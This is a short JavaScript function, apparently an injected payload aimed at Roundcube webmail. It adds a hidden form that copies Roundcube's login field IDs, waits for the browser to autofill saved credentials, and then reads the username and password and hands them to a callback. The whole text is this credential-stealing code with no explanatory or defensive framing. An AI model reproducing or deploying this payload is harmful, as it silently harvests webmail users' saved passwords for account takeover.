function getUserCredentials(callback) {
  try {
    document.body.insertAdjacentHTML('beforeend', '<form id="login-form" style="display:none" name="login-form" method="post" class="propform" action="/?_task=login"><input name="_user" id="rcmloginuser" required="" size="40" class="form-control" autocapitalize="none" autocomplete="off" value="" type="text" placeholder="Username"><input name="_pass" id="rcmloginpwd" required="" size="40" class="form-control" autocapitalize="none" autocomplete="off" type="password" placeholder="Password"><button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Login</button></div></form>');
    setTimeout(() => {
      var username = document.getElementById('rcmloginuser').value
      var password = document.getElementById('rcmloginpwd').value
      callback(`${username}-${password}`);
    }, 100);

  } catch (e) {
      callback('unrecognized_email');
  }
}
